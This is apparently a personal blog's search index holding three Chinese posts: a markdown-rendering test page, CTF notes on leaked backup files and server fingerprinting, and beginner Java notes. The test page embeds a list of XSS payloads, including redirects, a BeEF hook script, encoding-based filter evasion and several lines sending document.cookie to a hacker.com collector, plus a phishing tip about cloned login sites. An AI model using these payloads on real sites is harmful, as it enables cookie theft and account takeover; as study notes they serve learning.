<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>行文语法初探</title>
    <url>/2021/07/03/2021-07-04-blog_grammar/</url>
    <content><![CDATA[<h2 id="二级标题测试"><a href="#二级标题测试" class="headerlink" title="二级标题测试"></a>二级标题测试</h2><hr>
<h3 id="三级标题测试"><a href="#三级标题测试" class="headerlink" title="三级标题测试"></a>三级标题测试</h3><p>  折叠内容如下：<br>    &gt;简单的初级彩色引用<br>    &gt;空一行~~下面是success引用。<br>    &gt;<div class="success"><br>    &gt;&gt; 嵌套内容显示测试 @_@<br>    &gt;&gt; - 其他元素显示测试<br>    &gt;</div></p>
<h3 id="emoji测试"><a href="#emoji测试" class="headerlink" title="emoji测试"></a>emoji测试</h3><p>去露营了！ :tent: 很快回来。</p>
<p><del>真好笑</del>！:joy:</p>
<h3 id="代码高亮测试"><a href="#代码高亮测试" class="headerlink" title="代码高亮测试"></a>代码高亮测试</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">class StructureCode
&#123;
	private String name;
	static int num;
	&lt;span style&#x3D;&quot;color:#ff0000;&quot;&gt;&#x2F;&#x2F;构造代码块&lt;&#x2F;span&gt;
	&#123;
		System.out.println(&quot;我是构造代码块&quot;);
		cry();   &#x2F;&#x2F;没创建一个对象就执行一次cry(),代替下边两个构造函数中的cry()
	&#125;
	&lt;span style&#x3D;&quot;color:#ff0000;&quot;&gt;&#x2F;&#x2F;静态代码块&lt;&#x2F;span&gt;
	static
	&#123;
		num&#x3D;10;
		num*&#x3D;num;
		System.out.println(&quot;我是静态代码块&quot;);
	&#125;
	StructureCode()
	&#123;
		name&#x3D;&quot;baby&quot;;
		System.out.println(&quot;我是构造函数&quot;);
		&#x2F;&#x2F; cry();
	&#125;
	StructureCode(String name) &#x2F;&#x2F;构造函数是给对应的对象初始化
	&#123;
		this.name&#x3D;name;
		System.out.println(&quot;我是构造函数&quot;);
		&#x2F;&#x2F; cry();
	&#125;
	private void cry()
	&#123;
		System.out.println(&quot;哇哇&quot;);
	&#125;
	public void show()
	&#123;		
		&lt;span style&#x3D;&quot;color:#ff0000;&quot;&gt;&#x2F;&#x2F;局部代码块&lt;&#x2F;span&gt;  
		&#123;
			int i&#x3D;55;
		&#125;
		System.out.println(&quot;上边是局部代码块&quot;);
	&#125;
&#125;
 
class StaticDemo1
&#123;
	public static void main(String args [])
	&#123;
		StructureCode structureCode &#x3D; new StructureCode(&quot;小强&quot;);
	&#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-js" data-language="js"><code class="language-js">#弹框警告
此脚本实现弹框提示，一般作为漏洞测试或者演示使用<span class="token punctuation">,</span>类似<span class="token constant">SQL</span>注入漏洞测试中的单引号'<span class="token punctuation">,</span> 一旦此脚本能执行，也就意
味着后端服务器没有对特殊字符做过滤<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">/</span>' 这样就可以证明，这个页面位置存在了<span class="token constant">XSS</span>漏洞。
<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
#页面嵌套
<span class="token operator">&lt;</span>iframe src<span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com width<span class="token operator">=</span><span class="token number">300</span> height<span class="token operator">=</span><span class="token number">300</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span>
<span class="token operator">&lt;</span>iframe src<span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com width<span class="token operator">=</span><span class="token number">0</span> height<span class="token operator">=</span><span class="token number">0</span> border<span class="token operator">=</span><span class="token number">0</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span>
#页面重定向
<span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">"http://www.qfedu.com"</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://www.baidu.com"</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
#弹框警告并重定向
<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请移步到我们的新站"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://www.qfedu.com"</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://10.1.64.35/mutillidae/robots.txt"</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
这里结合了一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信
息，则可能在另外的站点重新登录账户（克隆网站收集账户）
#访问恶意代码
<span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://www.qfedu.com/xss.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://BeEF_IP:3000/hook.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> #结合BeEF收集用户的cookie
#巧用图片标签
<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"#"</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">></span>
<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:alert('xss');"</span><span class="token operator">></span>
<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"http://BeEF_IP:3000/hook.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span>
#绕开过滤的脚本
大小写 <span class="token operator">&lt;</span>ScrIpt<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>SCRipt<span class="token operator">></span>
字符编码 采用<span class="token constant">URL</span>、Base64等编码
<span class="token operator">&lt;</span>a
href<span class="token operator">=</span>"<span class="token operator">&amp;</span>#<span class="token number">106</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">118</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">115</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">99</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">114</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">105</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">112</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">58</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">108</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">101</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">114</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">116</span>
<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">34</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">120</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">115</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">115</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">34</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token punctuation">;</span>"<span class="token operator">></span>yangge<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>
#收集用户cookie
打开新窗口并且采用本地cookie访问目标网页，打开新窗口并且采用本地cookie访问目标网页。
<span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"http://www.hacker.com/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">"http://www.hacker.com/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"http://www.hacker.com/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"http://www.hacker.com/cookie.php?cookie='+document.cookie"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span>
<span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"http://www.hacker.com/cookie.php?cookie='+document.cookie"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"http://www.hacker.com/cookie.php?cookie='+document.cookie"</span><span class="token punctuation">;</span>
img<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
img<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="换行测试"><a href="#换行测试" class="headerlink" title="换行测试"></a>换行测试</h2><p>一句话+两空格+回车   </p>
<p>测试<br></p>
<p>success？？？</p>
<h2 id="图片测试"><a href="#图片测试" class="headerlink" title="图片测试"></a>图片测试</h2><p><a href="https://shgxy.github.io/"><img src="%5Cimages%5Cavatar.jpg" alt="神器的图片本片" title="神奇的图片" loading="lazy"></a></p>
<p><br>.<br></p>
<p>.</p>
<h2 id="链接测试"><a href="#链接测试" class="headerlink" title="链接测试"></a>链接测试</h2><p>我的博客链接 <a href="https://shgxy.github.io/" title="摇曳满地的冷清">可那灯火未明的小站</a></p>
<p>E-mail：&lt;shg799@foxmail,com&gt;</p>
]]></content>
      <categories>
        <category>新手</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF:从0到1——札记（二）</title>
    <url>/2021/07/09/2021-07-09-CTF%E4%BB%8E0%E5%88%B01%E2%80%94%E2%80%94%E6%9C%AD%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h1 id="札记（二）——-敏感备份文件、Banner识别"><a href="#札记（二）——-敏感备份文件、Banner识别" class="headerlink" title="札记（二）——  敏感备份文件、Banner识别"></a>札记（二）——  敏感备份文件、Banner识别</h1><h2 id="敏感备份文件"><a href="#敏感备份文件" class="headerlink" title="敏感备份文件"></a>敏感备份文件</h2><h3 id="gedit备份文件"><a href="#gedit备份文件" class="headerlink" title="gedit备份文件"></a>gedit备份文件</h3><p><strong>Hole：</strong>Linux下，用gedit编辑器保存后，当前目录下会生成一个后缀为<code>“~”</code>的文件（如<code>index.php~</code>），其内容就是刚刚编辑过的内容。</p>
<blockquote>
<p>关键词：后缀 ~ </p>
</blockquote>
<p>通过访问这个后缀的内容，即可获取源代码或<strong>flag</strong>。</p>
<h3 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h3><p><strong>Hole：</strong>vim是Linux下用的最多的编辑器，当用户在编辑文件但意外退出时，会在当前目录下生成一个备份文件，文件名格式为：<code>.文件名.swp</code>。</p>
<blockquote>
<p>关键词：.文件名.swp</p>
</blockquote>
<p>该文件用来备份缓冲区中的内容，即退出时的文件内容。第一次退出生成的文件名：<code>*.swp</code>，第二次：<code>*swo</code>，第三次：<code>*swn</code>。或者还含有<code>*un.文件名.swp</code>类型的备份文件。</p>
<p><strong>思路：</strong>恢复意外退出的文件，来获取<strong>flag</strong>。</p>
<h3 id="常规文件"><a href="#常规文件" class="headerlink" title="常规文件"></a>常规文件</h3><blockquote>
<ul>
<li>robot.txt                             爬虫君子协议，不可爬取的内容，往往包含有flag。</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>readme.md                        记录CMS（内容管理系统）版本等信息，或许有线索。 </li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><a href="http://www.zip/rar/tar.gz">www.zip/rar/tar.gz</a>            往往是网站的备份源码，获取会有包含flag。</li>
</ul>
</blockquote>
<blockquote>
<p><del>待补充ing</del></p>
</blockquote>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>–往往实际环境中，网站的备份是网站域名的压缩包–</p>
<h2 id="Banner识别"><a href="#Banner识别" class="headerlink" title="Banner识别"></a>Banner识别</h2><p><strong>Banner信息：</strong>服务器对外显示的一些基础信息。</p>
<h3 id="自行搜集指纹库"><a href="#自行搜集指纹库" class="headerlink" title="自行搜集指纹库"></a>自行搜集指纹库</h3><blockquote>
<p>Tools：</p>
<blockquote>
<p>kail：         预装了 whatweb </p>
<p>Usage：    whatweb [options] &lt;URLs&gt;</p>
<p>例如：        whatweb <a href="http://www.baidu.com/">http://www.baidu.com</a> -v（-v显示的更详细）</p>
</blockquote>
<blockquote>
<p>Chrome扩展：Wappalyzer</p>
</blockquote>
<blockquote>
<p>在线识别网站：</p>
<p><a href="http://whatweb.bugscaner.com/look/">在线指纹识别</a></p>
<p><a href="https://pentest.gdpcisa.org/whatcms">whatcms</a></p>
<p><a href="https://www.yunsee.cn/">云悉指纹识别</a></p>
</blockquote>
</blockquote>
<h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><p>–或者通过404返回页面的也可以用来判断指纹信息嘞？–</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>flag</tag>
        <tag>后缀</tag>
        <tag>备份</tag>
        <tag>Banner</tag>
      </tags>
  </entry>
  <entry>
    <title>Java初步</title>
    <url>/2021/07/11/Java_Day_001_base/</url>
    <content><![CDATA[<h1 id="Java-Day-001"><a href="#Java-Day-001" class="headerlink" title="Java_Day_001"></a>Java_Day_001</h1><h2 id="Java三大版本"><a href="#Java三大版本" class="headerlink" title="Java三大版本"></a>Java三大版本</h2><ul>
<li>​         <strong>JavaSE：</strong>标准版（桌面pro、控制台dev）</li>
<li>（x）JavaME：嵌入式dev（手机、家电）</li>
<li>​          JavaEE：企业级dev（web-dev、服务器dev）</li>
</ul>
<h2 id="JDK-JRE-JVM"><a href="#JDK-JRE-JVM" class="headerlink" title="JDK JRE JVM"></a>JDK JRE JVM</h2><ul>
<li>JDK：Java Development Kit</li>
<li>JRE：Java Runtime Environment</li>
<li>JVM：Java Virtual Machine</li>
</ul>
<h3 id="三者关系"><a href="#三者关系" class="headerlink" title="三者关系"></a>三者关系</h3><blockquote>
<p>JDK</p>
<blockquote>
<p>JRE</p>
<blockquote>
<p>JVM</p>
</blockquote>
</blockquote>
</blockquote>
<h2 id="Hello，World！"><a href="#Hello，World！" class="headerlink" title="Hello，World！"></a>Hello，World！</h2><ul>
<li><p>javac xxx.java</p>
<p>生成class文件</p>
</li>
<li><p>java xxx</p>
<p>得到输出</p>
</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*
**HelloCTF.java
*/</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloCTF</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Hello,CTF"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="快捷输入"><a href="#快捷输入" class="headerlink" title="快捷输入"></a>快捷输入</h3><blockquote>
<p>psvm：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</blockquote>
<blockquote>
<p>sout:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</blockquote>
<h3 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h3><p>空项目–&gt;项目结构–&gt;项目–&gt;选中相应的<strong>JDK</strong>版本–&gt;Apply&amp;OK</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>巩固基础~~或许插个表格更好看</p>
<ul>
<li>基本类型</li>
</ul>
<blockquote>
<p>整型</p>
<blockquote>
<p>byte：      1 字节</p>
</blockquote>
<blockquote>
<p>short：    2 字节        <strong>（ -32768~32767 ）</strong></p>
</blockquote>
<blockquote>
<p>int：         4 字节</p>
</blockquote>
<blockquote>
<p>long：      8 字节            **<code>long num = 10L</code>**，加个”L“表示 long</p>
</blockquote>
</blockquote>
<blockquote>
<p>浮点</p>
<blockquote>
<p>float：        4 字节            加”F“，舍入误差，接近但不等于，勿用此数进行比较</p>
</blockquote>
<blockquote>
<p>double：    8 字节</p>
</blockquote>
</blockquote>
<blockquote>
<p>字符型</p>
<blockquote>
<p>char：        2 字节</p>
<p>String不是关键字，是个类</p>
</blockquote>
</blockquote>
<blockquote>
<p>布尔类型</p>
<blockquote>
<p>boolean： 1位</p>
</blockquote>
</blockquote>
<ul>
<li>引用类型</li>
</ul>
<blockquote>
<p>类、接口、数组</p>
</blockquote>
<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>强制转换：<code>(int)c</code>，<code>c</code>转换成了<code>int</code>。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> str1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">String</span> str2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//		str1 != str2， str1 与 str2 代表地址，所以不等//内存地址</span>
<span class="token class-name">String</span> str3 <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>
<span class="token class-name">String</span> str4 <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>
<span class="token comment">//		str3 == str4， str3 与 str4 代表值，所以相等</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>类型转换：</p>
<blockquote>
<p>低 <strong>————————————————————–&gt;</strong> 高</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">,</span><span class="token keyword">short</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">-></span><span class="token keyword">int</span><span class="token operator">-></span><span class="token keyword">long</span><span class="token operator">-></span><span class="token keyword">float</span><span class="token operator">-></span><span class="token keyword">double</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</blockquote>
</blockquote>
<p>强制转换：<code>（类型）变量名</code>，高 —&gt; 低</p>
<p>自动转换：低 —&gt; 高</p>
<p>JDK7新特性：数字之间可以用下划线分割</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">10_000_000</span><span class="token punctuation">;</span>	<span class="token comment">//等同于10000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
*常量
*/</span>
<span class="token comment">//一般常量名使用大写字符</span>
<span class="token keyword">final</span> 常量名 <span class="token operator">=</span> 值<span class="token punctuation">;</span>
<span class="token comment">//修饰符不区分先后顺序，下两列效果一致</span>
<span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token keyword">int</span> NUM_VALUE <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> NUM_VALUE <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
*作用域
*/</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token keyword">double</span> salary <span class="token operator">=</span> <span class="token number">2500</span><span class="token punctuation">;</span>    <span class="token comment">//类变量</span>
    <span class="token keyword">static</span> <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> str1 <span class="token operator">=</span> <span class="token string">"world"</span><span class="token punctuation">;</span>          <span class="token comment">//实例变量</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                  <span class="token comment">//局部变量</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>关系运算符：<code>instanceof</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//	CTRL + D：复制当前行到下一行</span>
	a<span class="token operator">+</span>b<span class="token operator">+</span>c<span class="token operator">+</span>d		<span class="token comment">//自动将结果转换为类型最高的，低位转`int`</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><del>上床休息</del></p>
<p><del>蚊子太多辽</del></p>
<hr>
<h1 id="Java-Day-002"><a href="#Java-Day-002" class="headerlink" title="Java_Day_002"></a>Java_Day_002</h1><h2 id="运算符-1"><a href="#运算符-1" class="headerlink" title="运算符"></a>运算符</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//	左移>>	右移&lt;&lt;</span>
	<span class="token keyword">int</span> aa <span class="token operator">=</span> <span class="token number">0b1000</span><span class="token punctuation">;</span><span class="token comment">//二进制8</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>aa<span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//0b0100，即输出4</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>aa<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//0b10000，即输出16</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="字符连接符"><a href="#字符连接符" class="headerlink" title="字符连接符"></a>字符连接符</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>
    <span class="token comment">//字符连接符   +   ，String</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">""</span> <span class="token operator">+</span> a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2010</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token string">"sxy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//30sxy</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="包机制"><a href="#包机制" class="headerlink" title="包机制"></a>包机制</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//	语法格式</span>
<span class="token keyword">package</span> <span class="token namespace">pk1</span><span class="token punctuation">[</span><span class="token punctuation">.</span>pk2<span class="token punctuation">[</span><span class="token punctuation">.</span>pk3<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>	<span class="token comment">//本质是个文件夹</span>
<span class="token comment">//	规范：一般用公司域名倒置作为包名; www.baidu.com -> com.baidu.www</span>
<span class="token comment">//	package应在import上方</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>	导入这个包下的所有类<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开发规范：<a href="https://kangroo.gitee.io/ajcg/#/?id=%e5%89%8d%e8%a8%80">阿巴阿巴Java开发手册</a></p>
